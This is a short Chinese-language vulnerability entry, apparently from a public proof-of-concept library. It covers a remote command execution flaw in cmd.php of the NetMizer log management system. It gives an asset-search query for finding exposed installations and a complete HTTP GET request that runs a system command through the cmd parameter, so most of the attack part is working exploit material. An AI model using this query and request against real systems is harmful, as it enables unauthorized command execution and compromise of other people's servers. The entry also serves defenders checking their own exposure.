---
source: "wy876 漏洞文库"
---

# NetMizer 日志管理系统cmd存在命令执漏洞

### 一、漏洞描述
NetMizer 日志管理系统 cmd.php中存在远程命令执行漏洞，攻击者通过传入 cmd参数即可命令执行

### 二、影响版本
<font style="color:#000000;">NetMizer</font>

### 三、资产测绘
```plain
title="NetMizer 日志管理系统"
```


### 四、漏洞复现
```plain
GET /data/manage/cmd.php?cmd=id HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hi1upuiio8gsogz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
